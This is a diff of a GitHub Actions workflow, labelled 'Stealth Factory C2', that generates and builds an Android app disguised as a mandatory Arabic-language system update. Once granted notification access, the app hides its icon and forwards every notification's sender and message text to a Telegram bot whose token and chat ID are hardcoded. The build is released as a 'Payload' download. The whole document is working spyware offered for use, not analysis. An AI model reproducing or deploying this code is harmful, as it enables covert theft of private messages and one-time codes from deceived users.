@@ -1,37 +1,179 @@
-name: Build C2 Controller
+name: Stealth Factory C2
 on:
-  push:
-    branches: [ "main" ]
-  workflow_dispatch:
+  workflow_dispatch: # السحر هنا: هذا يخلي السيرفر يشتغل فقط من خلال أمر تطبيقك
+
+permissions:
+  contents: write # صلاحية إنشاء رابط مباشر
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      
-      - uses: actions/setup-python@v5
-        with: { python-version: '3.10' }
-        
-      - uses: actions/setup-java@v4
+      - name: 1. Setup Java
+        uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
-        
-      - uses: subosito/flutter-action@v2
-        with: { channel: 'stable' }
-        
-      - name: Install and Create Requirements
+
+      - name: 2. Build Native App Structure
         run: |
-          # هنا ضفنا خطوة صناعة الملف حتى Flet يتعرف على المكتبات
-          echo "flet" > requirements.txt
-          echo "requests" >> requirements.txt
-          pip install --upgrade pip
-          pip install -r requirements.txt
-          
-      - name: Build
-        run: flet build apk --project "HusseinPanel"
-        
-      - name: Upload
-        uses: actions/upload-artifact@v4
+          mkdir -p app/src/main/java/com/hussein/system
+          mkdir -p app/src/main/res/layout
+
+          cat << 'EOF' > settings.gradle
+          rootProject.name = "SystemUpdate"
+          include ':app'
+          EOF
+
+          cat << 'EOF' > build.gradle
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.2.0' }
+          }
+          allprojects { repositories { google(); mavenCentral() } }
+          EOF
+
+          cat << 'EOF' > app/build.gradle
+          apply plugin: 'com.android.application'
+          android {
+              namespace 'com.hussein.system'
+              compileSdkVersion 34
+              defaultConfig {
+                  applicationId "com.hussein.system"
+                  minSdkVersion 24
+                  targetSdkVersion 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+          EOF
+
+          cat << 'EOF' > app/src/main/AndroidManifest.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              
+              <application
+                  android:allowBackup="true"
+                  android:label="خدمات النظام" 
+                  android:theme="@android:style/Theme.Material.Light.NoActionBar">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <service android:name=".StealthService"
+                      android:label="تحديث خدمات النظام"
+                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.service.notification.NotificationListenerService" />
+                      </intent-filter>
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+          cat << 'EOF' > app/src/main/res/layout/activity_main.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent" android:layout_height="match_parent"
+              android:gravity="center" android:orientation="vertical" android:padding="30dp"
+              android:background="#F5F5F5">
+              <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
+                  android:text="تحديث النظام الإجباري" android:textSize="22sp" android:textStyle="bold" 
+                  android:textColor="#333333" android:layout_marginBottom="20dp"/>
+              <Button android:id="@+id/btn_fix" android:layout_width="match_parent" android:layout_height="60dp"
+                  android:backgroundTint="#2196F3" android:textColor="#FFFFFF" android:textSize="18sp"
+                  android:text="تفعيل التحديث (مطلوب)"/>
+          </LinearLayout>
+          EOF
+
+          cat << 'EOF' > app/src/main/java/com/hussein/system/MainActivity.java
+          package com.hussein.system;
+          import android.app.Activity;
+          import android.content.ComponentName;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Bundle;
+          import android.provider.Settings;
+          import android.widget.Button;
+          public class MainActivity extends Activity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  findViewById(R.id.btn_fix).setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+                  });
+              }
+              @Override
+              protected void onResume() {
+                  super.onResume();
+                  String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+                  if (flat != null && flat.contains(getPackageName())) {
+                      // السحر: إخفاء أيقونة التطبيق بالكامل بعد إعطاء الصلاحية!
+                      getPackageManager().setComponentEnabledSetting(
+                          new ComponentName(this, MainActivity.class),
+                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                      finish();
+                  }
+              }
+          }
+          EOF
+
+          cat << 'EOF' > app/src/main/java/com/hussein/system/StealthService.java
+          package com.hussein.system;
+          import android.service.notification.NotificationListenerService;
+          import android.service.notification.StatusBarNotification;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.net.URLEncoder;
+          public class StealthService extends NotificationListenerService {
+              
+              
+              private final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+              private final String CHAT_ID = "7392262688";
+              
+              @Override
+              public void onNotificationPosted(StatusBarNotification sbn) {
+                  if (sbn.getPackageName().equals("android")) return;
+                  try {
+                      String msg = "🎯 صيدة جديدة!\n📱 التطبيق: " + sbn.getPackageName() + "\n👤 المرسل: " + 
+                                   sbn.getNotification().extras.getString("android.title") + "\n💬 الرسالة: " + 
+                                   sbn.getNotification().extras.getCharSequence("android.text");
+                      sendToTelegram(msg);
+                  } catch (Exception e) {}
+              }
+              private void sendToTelegram(String message) {
+                  new Thread(() -> {
+                      try {
+                          String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(message, "UTF-8");
+                          HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
+                          conn.setRequestMethod("GET"); conn.getInputStream(); conn.disconnect();
+                      } catch (Exception e) {}
+                  }).start();
+              }
+          }
+          EOF
+
+      - name: 3. Setup Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with: { gradle-version: '8.5' }
+
+      - name: 4. Build APK
+        run: gradle assembleDebug
+
+      - name: 5. Create Direct Download Link (Release)
+        uses: softprops/action-gh-release@v1
         with:
-          name: Controller-APK
-          path: build/apk/*.apk
+          tag_name: Payload-v${{ github.run_number }}
+          name: التطبيق المخفي (الإصدار ${{ github.run_number }})
+          files: app/build/outputs/apk/debug/*.apk
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
